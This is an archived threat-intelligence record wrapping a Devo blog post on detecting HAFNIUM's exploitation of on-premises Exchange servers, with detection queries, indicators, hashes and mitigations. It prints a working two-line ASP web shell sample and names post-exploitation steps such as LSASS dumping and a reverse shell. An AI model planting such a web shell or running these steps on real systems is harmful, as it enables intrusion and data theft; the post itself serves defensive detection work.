{
    "id": "8d37917c-f37b-43f5-8e90-c8d284034093",
    "created_at": "2023-01-12T15:10:22.735613Z",
    "updated_at": "2025-03-27T02:12:03.892225Z",
    "deleted_at": null,
    "sha1_hash": "0660e8ef50514998ef58157029ee5925b36cb40e",
    "title": "2021-03-11 - Detection and Investigation Using Devo- HAFNIUM 0-day Exploits on Microsoft Exchange Service",
    "authors": "",
    "file_creation_date": "2022-05-28T01:55:49Z",
    "file_modification_date": "2022-05-28T01:55:49Z",
    "file_size": 447547,
    "plain_text": "# Detection and Investigation Using Devo: HAFNIUM 0-day Exploits on Microsoft Exchange Service\n\n**[devo.com/blog/detect-and-investigate-hafnium-using-devo/](https://www.devo.com/blog/detect-and-investigate-hafnium-using-devo/)**\n\nMarch 11, 2021\n\nOn March 2, 2021, Microsoft [announced it had detected the use of multiple 0-day exploits in](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)\nlimited and targeted attacks of on-premises versions of Microsoft Exchange Server. The\nMicrosoft Threat Intelligence Center (MSTIC) attributes this campaign—with high confidence\n—to HAFNIUM, a group assessed to be state-sponsored and operating out of China, based\non observed victimology, tactics and procedures.\n\nThis post provides details about the attacks and valuable information compiled by the entire\nDevo security team. For [Devo Security Operations customers, all of the alerts shown in this](https://www.devo.com/applications/cloud-siem/)\npost and all indicators are available in the SecOps application.\n\n**What Happened**\n\n[In the observed attacks, threat actors leveraged CVE-2021-26855 to send arbitrary HTTP](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855)\nrequests and authenticate to an Exchange server. Additional vulnerabilities—CVE-202126857, [CVE-2021-26858, and](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE%202021-26858) [CVE-2021-27065—exploit on-premises Exchange servers,](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE%202021-27065)\ngiving attackers access to email accounts and allowing installation of additional malware to\nfacilitate long-term access to victim environments.\n\n\n-----\n\nAfter exploiting these vulnerabilities to gain initial access, HAFNIUM operators deployed\nweb shells on the compromised servers. Web shells potentially allow attackers to steal data\nand perform additional malicious actions that lead to further compromise. Here’s an example\nof a web shell deployed by HAFNIUM, written in ASP:\n```\n<%@ Page Language=\"Jscript\"%>\n<%System.IO.File.WriteAllText(Request.Item[\"p\"],Request.Item[\"c\"]);%>\n\n```\nAttack Details\n\nFollowing web shell deployment, HAFNIUM operators performed the following postexploitation activity:\n\nUsing Procdump to dump the LSASS process memory\nUsing 7-Zip to compress stolen data into ZIP files for exfiltration\nAdding and using Exchange PowerShell snap-ins to export mailbox data\nUsing the Nishang Invoke-PowerShellTcpOneLine reverse shell\n[Downloading tools such as Covenant,](https://github.com/cobbr/Covenant) [Nishang and](https://github.com/samratashok/nishang) [PowerCat from GitHub for remote](https://github.com/besimorhino/powercat)\naccess and command and control\n[Relying on](https://blog.talosintelligence.com/2019/08/china-chopper-still-active-9-years-later.html) [9+-year-old](https://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.html) [web shells, such as](https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html) [ChinaChopper](https://threatpost.com/microsoft-exchange-zero-day-attackers-spy/164438/)\n\nHAFNIUM operators also were able to download the Exchange offline address book from\ncompromised systems, which contains information about an organization and its users.\n\nAffected Systems\n\nOnline versions of Microsoft Exchange have not been affected by these attacks. Here are the\nsystems that have been hit:\n\nMicrosoft Exchange Server 2013\nMicrosoft Exchange Server 2016\nMicrosoft Exchange Server 2019\n\nIndicators of Compromise & Detection\n\nMultilookup\n\n[Devo creates and maintains a lookup available to all domains. It contains all IOCs collected](https://docs.devo.com/confluence/ndt/flow/unit-types/data/lookup)\nfrom multiple sources. msfhafnium0day contains hashes, IP addresses, and filenames.\n\n\n-----\n\nLookup example of use:\n```\nselect `lu/msfhafnium0day/threat`(resource) as dmsfhafnium0day\n\n```\n**Web shell files**\n\nFU7Vif5K.aspx web.aspx aspnet_www.aspx ICK4sMeJ.aspx\n\nhelp.aspx aspnet_client.aspx jFabdYwZ.aspx document.aspx\n\naspnettest.aspx hjmQWreC.aspx errorEE.aspx discover.aspx\n\nCX47ujQS.aspx errorEEE.aspx HttpProxy.aspx gwVPU69R.aspx\n\nerrorEW.aspx shellex.aspx M2gRp7Zo.aspx errorFF.aspx\n\nsupp0rt.aspx XJrBqeul.aspx error.aspx xx.aspx\n\nTx2tWFMb.aspx errorcheck.aspx shell.aspx t.aspx\n\nhealthcheck.aspx aspnet_iisstart.aspx one.aspx\n\n**Alerts (Persistence)**\n\nMITRE ATT&CK Tactic Persistence\n\nMITRE ATT&CK Technique Server Software Component: Web Shell\n\n**SecOpsHAFNIUMWebShellsTargetingExchangeServers**\n\nfrom web.all.access\ngroup every 5m by srcIp, url\n\nevery 5m\n\nselect str(srcIp) as entity_sourceIP\n\nselect `lu/SecOpsAssetRole/class`(entity_sourceIP) as AssetRole // Get asset role from\nSecOpsRole Lookup\n\n//<filtering_section>\n\nselect peek(url, re(“[^/]+$”), 0) as resource\n\nwhere isnotnull(resource)\n\nselect `lu/msfhafnium0day/threat`(resource) as listedmsfhafnium0day\n\nwhere isnotnull(listedmsfhafnium0day)\n\nselect mm2asn(srcIp) as enrichStream_entity_sourceIP_ASN\n\n\n-----\n\nselect mmisp(srcIp) as enrichStream_entity_sourceIP_ISP\n\nselect mmcountry(srcIp) as enrichStream_entity_sourceIP_country\n\nselect ifthenelse(enrichStream_entity_sourceIP_country = “A1”, true, false) as\nenrichStream_entity_sourceIP_isAnonymousProxy\n\nselect `lu/mispIndicator/category`(entity_sourceIP) as indicator\n\nselect `lu/mispIndicator/type`(entity_sourceIP) as misp_indicator_type\n\nselect `lu/mispIndicator/event_id`(entity_sourceIP) as misp_indicator_event_id\n\nselect `lu/SecOpsLocation/country`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationCountry\n\nselect `lu/SecOpsLocation/city`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationCity\n\nselect `lu/SecOpsLocation/state`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationState\n\nselect `lu/SecOpsLocation/lat`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationLat\n\nselect `lu/SecOpsLocation/lon`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationLon\n\nselect “Detection” as alertType\n\nselect “Persistence” as alertMitreTactics\n\nselect “Server Software Component: Web Shell” as alertMitreTechniques\n\nselect 4 as alertPriority\n\n**User Agents**\n\nantSword/v2.1\n\n[Googlebot/2.1+(+http://www.googlebot.com/bot.html)](http://www.googlebot.com/bot.html)\n\n[Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)](http://www.baidu.com/search/spider.html)\n\n[DuckDuckBot/1.0;+(+http://duckduckgo.com/duckduckbot.html)](http://duckduckgo.com/duckduckbot.html)\n\n[facebookexternalhit/1.1+(+http://www.facebook.com/externalhit_uatext.php)](http://www.facebook.com/externalhit_uatext.php)\n\n[Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)](http://www.baidu.com/search/spider.html)\n\n[Mozilla/5.0+(compatible;+Bingbot/2.0;++http://www.bing.com/bingbot.htm)](http://www.bing.com/bingbot.htm)\n\n\n-----\n\n[Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html](http://www.google.com/bot.html)\n\nMozilla/5.0+(compatible;+Konqueror/3.5;+Linux)+KHTML/3.5.5+(like+Gecko)+(ExabotThumbnails)\n\n[Mozilla/5.0+(compatible;+Yahoo!+Slurp;+http://help.yahoo.com/help/us/ysearch/slurp)](http://help.yahoo.com/help/us/ysearch/slurp)\n\n[Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots)](http://yandex.com/bots)\n\nMozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+\n(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36\n\n[ExchangeServicesClient/0.0.0.0](http://0.0.0.0/)\n\npython-requests/2.19.1\n\npython-requests/2.25.1\n\n**Alerts (Initial Access)**\n\nMITRE ATT&CK Tactic Initial Access\n\nMITRE ATT&CK Technique Exploit Public-Facing Application\n\n**SecOpsHAFNIUMUserAgentsTargetingExchangeServers**\n\nfrom domains.all\n\nwhere isnotnull(useragent)\n\ngroup every 5m by useragent, domain, url, source\n\nevery 5m\n\nselect domain as entity_sourceHostname\n\nwhere toktains(useragent,”antSword/v2.1″) or\n\ntoktains(useragent,”Googlebot/2.1+(+http://www.googlebot.com/bot.html)”) or\n\ntoktains(useragent,”Mozilla/5.0+\n(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)”) or\n\ntoktains(useragent,”DuckDuckBot/1.0;+(+http://duckduckgo.com/duckduckbot.html)”) or\n\ntoktains(useragent,”facebookexternalhit/1.1+\n(+http://www.facebook.com/externalhit_uatext.php)”) or\n\ntoktains(useragent,”Mozilla/5.0+\n(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)”) or\n\n\n-----\n\ntoktains(useragent,”Mozilla/5.0+\n(compatible;+Bingbot/2.0;++http://www.bing.com/bingbot.htm)”) or\n\ntoktains(useragent,”Mozilla/5.0+\n(compatible;+Googlebot/2.1;++http://www.google.com/bot.html”) or\n\ntoktains(useragent,”Mozilla/5.0+(compatible;+Konqueror/3.5;+Linux)+KHTML/3.5.5+\n(like+Gecko)+(Exabot-Thumbnails)”) or\n\ntoktains(useragent,”Mozilla/5.0+\n(compatible;+Yahoo!+Slurp;+http://help.yahoo.com/help/us/ysearch/slurp)”) or\n\ntoktains(useragent,”Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots)”)\nor\n\ntoktains(useragent,”Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+\n(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36″)\n\nselect “Detection” as alertType\n\nselect “Initial Access” as alertMitreTactics\n\nselect “Exploit Public-Facing Application” as alertMitreTechniques\n\nselect 4 as alertPriority\n\n**IP Addresses**\n\n```\n103.77.19\n2.219\n203.160.6\n9.66\n108.61.24\n6.56\n80.92.205\n.81\n167.99.16\n8.251\n\n```\n```\n192.81.208\n.169\n104.250.19\n1.110\n5.254.43.1\n8\n157.230.22\n1.198\n80.92.205.\n81\n\n```\n```\n104.140.11\n4.110\n211.56.98.\n146\n149.28.14.\n163\n5.2.69.14\n185.250.15\n1.72\n\n```\n\n-----\n\n```\n91.192.10\n3.43\n\n```\n```\n165.232.15\n4.116\n\n```\n\n**Alerts (Initial Access)**\n\nMITRE ATT&CK Tactic Initial Access\n\nMITRE ATT&CK Technique External Remote Services\n\n**SecOpsHAFNIUMNetworkActivityTargetingExchangeServers**\n\nfrom firewall.all.traffic\n\nwhere ispublic(srcIp)\n\nselect `lu/msfhafnium0day/threat`(str(srcIp)) as ismsfhafnium0day\n\nwhere isnotnull(ismsfhafnium0day)\n\ngroup every 5m by srcIp, dstIp, dstPort\n\nselect str(srcIp) as entity_sourceIP\n\nselect str(dstIp) as entity_destinationIP\n\nselect mm2asn(srcIp) as enrichStream_entity_sourceIP_ASN\n\nselect mmisp(srcIp) as enrichStream_entity_sourceIP_ISP\n\nselect mmcountry(srcIp) as enrichStream_entity_sourceIP_country\n\nselect ifthenelse(enrichStream_entity_sourceIP_country = “A1”, true, false) as\nenrichStream_entity_sourceIP_isAnonymousProxy\n\nselect `lu/mispIndicator/category`(entity_sourceIP) as indicator\n\nselect `lu/mispIndicator/type`(entity_sourceIP) as misp_indicator_type\n\nselect `lu/mispIndicator/event_id`(entity_sourceIP) as misp_indicator_event_id\n\nselect `lu/SecOpsLocation/country`(entity_destinationIP) as\nenrichStream_entity_sourceIP_locationCountry\n\nselect `lu/SecOpsLocation/city`(entity_destinationIP) as\nenrichStream_entity_sourceIP_locationCity\n\nselect `lu/SecOpsLocation/state`(entity_destinationIP) as\nenrichStream_entity_sourceIP_locationState\n\n\n-----\n\nselect `lu/SecOpsLocation/lat`(entity_destinationIP) as\nenrichStream_entity_sourceIP_locationLat\n\nselect `lu/SecOpsLocation/lon`(entity_destinationIP) as\nenrichStream_entity_sourceIP_locationLon\n\nselect “Detection” as alertType\n\nselect “Initial Access” as alertMitreTactics\n\nselect “External Remote Services” as alertMitreTechniques\n\nselect 4 as alertPriority\n\n**Um Services**\n\nBased on the alert shipped by Azure Sentinel we can detect suspicious activity in Windows\nlogs.\n```\nhttps://github.com/Azure/AzureSentinel/blob/master/Detections/MultipleDataSources/HAFNIUMUmServiceSuspiciousFile.ya\nml\n\n```\n**Alerts (Discovery)**\n\nMITRE ATT&CK Tactic Discovery\n\nMITRE ATT&CK Technique File and Directory Discovery\n\n**SecOpsHAFNIUMUmServiceSuspiciousFileTargetingExchangeServers**\n\nfrom box.all.win\n\nwhere eventID = 4663\n\nwhere weaktoktains(procName, “umworkerprocess.exe”) or\n\nweaktoktains(procName, “UMService.exe”)\n\nwhere weaktoktains(objName, “.php”) or\n\nweaktoktains(objName, “.jsp”) or\n\nweaktoktains(objName, “.js”) or\n\nweaktoktains(objName, “.aspx”) or\n\nweaktoktains(objName, “.asmx”) or\n\nweaktoktains(objName, “.asax”) or\n\n\n-----\n\nweaktoktains(objName, “.cfm”) or\n\nweaktoktains(objName, “.shtml”)\n\ngroup every 5m by eventID,machineIp,account\n\nevery 5m\n\nselect str(machineIp) as entity_sourceIP\n\nselect `lu/SecOpsAssetRole/class`(entity_sourceIP) as AssetRole // Get asset role from\nSecOpsRole Lookup\n\n//<filtering_section>\n\nselect `lu/SecOpsLocation/country`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationCountry\n\nselect `lu/SecOpsLocation/city`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationCity\n\nselect `lu/SecOpsLocation/state`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationState\n\nselect `lu/SecOpsLocation/lat`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationLat\n\nselect `lu/SecOpsLocation/lon`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationLon\n\nselect “Detection” as alertType\n\nselect “Discovery” as alertMitreTactics\n\nselect “File and Directory Discovery” as alertMitreTechniques\n\nselect 4 as alertPriority\n\n**Hashes**\n\nb75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0\n\n097549cf7d0f76f0d99edf8b2d91c60977fd6a96e4b8c3c94b0b1733dc026d3e\n\n2b6f1ebb2208e93ade4a6424555d6a8341fd6d9f60c25e44afe11008f5c1aad1\n\n65149e036fff06026d80ac9ad4d156332822dc93142cf1a122b1841ec8de34b5\n\n511df0e2df9bfa5521b588cc4bb5f8c5a321801b803394ebc493db1ef3c78fa1\n\n4edc7770464a14f54d17f36dc9d0fe854f68b346b27b35a6f5839adf1f13f8ea\n\n\n-----\n\n811157f9c7003ba8d17b45eb3cf09bef2cecd2701cedb675274949296a6a183d\n\n1631a90eb5395c4e19c7dbcbf611bbe6444ff312eb7937e286e4637cb9e72944\n\n**Alerts (Initial Access)**\n\nMITRE ATT&CK Tactic Execution\n\nMITRE ATT&CK Technique User Execution: Malicious File\n\n**SecOpsHAFNIUMHashFoundFileTargetingExchangeServers**\n\nfrom edr.all.threats\n\nwhere isnotnull(sha256hash)\n\nselect `lu/msfhafnium0day/threat`(sha256hash) as ismsfhafnium0day\n\nwhere isnotnull(ismsfhafnium0day)\n\ngroup every 5m by ip, mac, sha256hash, filename, host, threat,ismsfhafnium0day\n\nwhere isnotnull(ip)\n\nselect str(ip) as entity_sourceIP\n\nselect `lu/SecOpsAssetRole/class`(entity_sourceIP) as AssetRole // Get asset role from\nSecOpsRole Lookup\n\n//<filtering_section>\n\nselect mm2asn(ip) as enrichStream_entity_sourceIP_ASN\n\nselect mmisp(ip) as enrichStream_entity_sourceIP_ISP\n\nselect mmcountry(ip) as enrichStream_entity_sourceIP_country\n\nselect ifthenelse(enrichStream_entity_sourceIP_country = “A1”, true, false) as\nenrichStream_entity_sourceIP_isAnonymousProxy\n\nselect `lu/mispIndicator/category`(entity_sourceIP) as indicator\n\nselect `lu/mispIndicator/type`(entity_sourceIP) as misp_indicator_type\n\nselect `lu/mispIndicator/event_id`(entity_sourceIP) as misp_indicator_event_id\n\nselect `lu/SecOpsLocation/country`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationCountry\n\nselect `lu/SecOpsLocation/city`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationCity\n\n\n-----\n\nselect `lu/SecOpsLocation/state`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationState\n\nselect `lu/SecOpsLocation/lat`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationLat\n\nselect `lu/SecOpsLocation/lon`(entity_sourceIP) as\nenrichStream_entity_sourceIP_locationLon\n\nselect “Detection” as alertType\n\nselect “Execution” as alertMitreTactics\n\nselect “User Execution: Malicious File” as alertMitreTechniques\n\nselect 4 as alertPriority\n\n**HTTP Request**\n\n/owa/auth/Current/themes/resources/logon.css\n\n/owa/auth/Current/themes/resources/owafont_ja.css\n\n/owa/auth/Current/themes/resources/lgnbotl.gif\n\n/owa/auth/Current/themes/resources/owafont_ko.css\n\n/owa/auth/Current/themes/resources/SegoeUI-SemiBold.eot\n\n/owa/auth/Current/themes/resources/SegoeUI-SemiLight.ttf\n\n/owa/auth/Current/themes/resources/lgnbotl.gif\n\n/owa/auth/Current/\n\n/ecp/default.flt\n\n/ecp/main.css\n\n**Alerts (Initial Access)**\n\nMITRE ATT&CK Tactic Initial Access\n\nMITRE ATT&CK Technique Exploit Public-Facing Application\n\n**SecOpsHAFNIUMHttpPostTargetingExchangeServers**\n\nfrom web.all.access\n\nselect uripath(url) as uripath\n\n\n-----\n\nselect `lu/msfhafnium0day/threat`(uripath) as msfhafnium0day\n\nselect length(split(peek(url, re(“[^/]+$”), 0), “.”, 0)) as onecharacter\n\nwhere isnotnull(msfhafnium0day) or (onecharacter = 1 and endswith(uripath,”js”))\n\ngroup every 5m by srcIp, url, userAgent\n\nevery 5m\n\nselect str(srcIp) as entity_sourceIP\n\nselect `lu/SecOpsAssetRole/class`(entity_sourceIP) as AssetRole // Get asset role from\nSecOpsRole Lookup\n\n//<filtering_section>\n\nselect mm2asn(srcIp) as enrichStream_entity_sourceIP_ASN\n\nselect mmisp(srcIp) as enrichStream_entity_sourceIP_ISP\n\nselect mmcountry(srcIp) as enrichStream_entity_sourceIP_country\n\nselect ifthenelse(enrichStream_entity_sourceIP_country = “A1”, true, false) as\nenrichStream_entity_sourceIP_isAnonymousProxy\n\nselect `lu/mispIndicator/category`(entity_sourceIP) as indicator\n\nselect `lu/mispIndicator/type`(entity_sourceIP) as misp_indicator_type\n\nselect `lu/mispIndicator/event_id`(entity_sourceIP) as misp_indicator_event_id\n\nselect “Detection” as alertType\n\nselect “Initial Access” as alertMitreTactics\n\nselect “Exploit Public-Facing Application” as alertMitreTechniques\n\nselect 4 as alertPriority\n\n**Mitigations**\n\nFollowing is a list of actions that server administrators can perform:\n\nRestrict untrusted connections to port 443, or set up a VPN to separate the Exchange\nServer from external access.\nBlock external access to on-premise Exchange:\nRestrict external access to OWA URL: /owa/.\nRestrict external access to Exchange Admin Center (EAC) aka Exchange Control\nPanel (ECP) URL: /ecp/\n\n\n-----\n\nMicrosoft released some mitigations in its Response Center that cover the different\nrelated vulnerabilities: https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchangeserver-vulnerabilities-mitigations-march-2021/\n\n**References**\n\n[1] [https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)\n\n[2] [https://blogs.microsoft.com/on-the-issues/2021/03/02/new-nation-state-cyberattacks/](https://blogs.microsoft.com/on-the-issues/2021/03/02/new-nation-state-cyberattacks/)\n\n[3] [https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-26855](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-26855)\n\n[4]\nhttps://www.reddit.com/r/msp/comments/lwmo5c/mass_exploitation_of_onprem_exchange_s\nervers/\n\n[5] [https://gist.github.com/JohnHammond/0b4a45cad4f4ed3324939d72dc599883](https://gist.github.com/JohnHammond/0b4a45cad4f4ed3324939d72dc599883)\n\n[6] https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zeroday-vulnerabilities/\n\n[7] [https://us-cert.cisa.gov/ncas/alerts/aa21-062a](https://us-cert.cisa.gov/ncas/alerts/aa21-062a)\n\n[8] https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zeroday-vulnerabilities/\n\n[9] https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitationof-microsoft-exchange-zero-day-vulnerabilities.html\n\n**Appendix I: Other IOCs**\n\nWeb shell Detection resource: https://github.com/nsacyber/Mitigating-WebShells/blob/master/anomolous_uris.splunk.txt\n\nC:inetpubwwwrootaspnet_clientshell.aspx\n\nC:inetpubwwwrootaspnet_clientshellex.aspx\n\nC:inetpubwwwrootaspnet_clienterrorcheck.aspx\n\nC:inetpubwwwrootaspnet_clientt.aspx\n\nC:inetpubwwwrootaspnet_clientdiscover.aspx\n\nC:inetpubwwwrootaspnet_clientaspnettest.aspx\n\nC:inetpubwwwrootaspnet_clientsystem_weberror.aspx\n\nC:inetpubwwwrootaspnet_clientsystem_web\n\n\n-----\n\nC:inetpubwwwrootaspnet_clientsupp0rt.aspx\n\nC:inetpubwwwrootaspnet_clientHttpProxy.aspx\n\ninetpubwwwrootaspnet_client (any .aspx file under this folder or sub folders)\n\n<exchange install path>FrontEndHttpProxyecpauth (any file besides TimeoutLogoff.aspx)\n\n<exchange install path>FrontEndHttpProxyowaauth (any file or modified file that is not part of\na standard install)\n\n<exchange install path>FrontEndHttpProxyowaauthCurrent<any aspx file in this folder or\nsubfolders>\n\n<exchange install path>FrontEndHttpProxyowaauth<folder with version number><any aspx\nfile in this folder or subfolders>\n\nPowershell cmdlet from RCE\n\nS_CMD=Set-OabVirtualDirectory.ExternalUrl=’\n\n## More Data. More Clarity. More Confidence.\n\n[Get Started](https://www.devo.com/evaluate/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-11 - Detection and Investigation Using Devo- HAFNIUM 0-day Exploits on Microsoft Exchange Service.pdf"
    ],
    "report_names": [
        "2021-03-11 - Detection and Investigation Using Devo- HAFNIUM 0-day Exploits on Microsoft Exchange Service.pdf"
    ],
    "threat_actors": [
        {
            "id": "529c1ae9-4579-4245-86a6-20f4563a695d",
            "created_at": "2022-10-25T16:07:23.702006Z",
            "updated_at": "2025-03-27T02:02:09.93109Z",
            "deleted_at": null,
            "main_name": "Hafnium",
            "aliases": [
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "ETDA:Hafnium",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7c969685-459b-4c93-a788-74108eab6f47",
            "created_at": "2023-01-06T13:46:39.189751Z",
            "updated_at": "2025-03-27T02:00:03.017103Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "ATK233",
                "G0125",
                "Operation Exchange Marauder",
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "MISPGALAXY:HAFNIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2704d770-43b4-4bc4-8a5a-05df87416848",
            "created_at": "2022-10-25T15:50:23.306305Z",
            "updated_at": "2025-03-27T02:00:55.43633Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "HAFNIUM",
                "Operation Exchange Marauder",
                "Silk Typhoon"
            ],
            "source_name": "MITRE:HAFNIUM",
            "tools": [
                "Tarrask",
                "ASPXSpy",
                "Impacket",
                "PsExec",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536222,
    "ts_updated_at": 1743041523,
    "ts_creation_date": 1653702949,
    "ts_modification_date": 1653702949,
    "files": {
        "pdf": "https://archive.orkl.eu/0660e8ef50514998ef58157029ee5925b36cb40e.pdf",
        "text": "https://archive.orkl.eu/0660e8ef50514998ef58157029ee5925b36cb40e.txt",
        "img": "https://archive.orkl.eu/0660e8ef50514998ef58157029ee5925b36cb40e.jpg"
    }
}